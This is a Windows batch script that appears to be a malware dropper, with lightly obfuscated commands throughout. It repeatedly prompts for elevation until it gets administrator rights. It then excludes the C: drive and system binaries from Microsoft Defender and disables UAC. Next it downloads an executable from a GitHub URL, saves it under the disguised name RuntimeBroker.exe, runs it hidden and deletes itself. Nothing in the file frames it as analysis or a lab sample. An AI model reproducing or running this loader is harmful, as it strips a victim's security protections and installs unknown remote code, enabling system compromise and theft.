@echo off
setlocal EnableDelayedExpansion
set "_=NET SESSION >nul 2>&1"
call :X !_!
if %errorlevel%==0 (goto :A) else (goto :B)

:A
set "p=power^shell -ExecutionPolicy By^pass -Com^mand"
%p% "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath 'C:\','C:\cmd.exe','C:\conhost.exe','C:\cvtres.exe','C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe','C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe','C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue" >nul 2>&1

%p% "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0" >nul 2>&1

%p% "if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 }" >nul 2>&1
if %errorlevel% neq 0 (goto :A)

time^out /t 2 >nul 2>&1

%p% "$ProgressPreference='SilentlyContinue';$ErrorActionPreference='SilentlyContinue';iwr -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing" >nul 2>&1

:W
if not exist "%TEMP%\RuntimeBroker.exe" (
    time^out /t 1 >nul
    goto :W
)
st^art "" /B "%TEMP%\RuntimeBroker.exe" >nul 2>&1
de^l /f /q "%~f0" >nul 2>&1
exit /b

:B
po^wershell -WindowStyle Hidden -Com^mand "Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs" >nul 2>&1
if %errorlevel% neq 0 (
    time^out /t 3 >nul
    goto :B
)
exit /b

:X
%*
exit /b
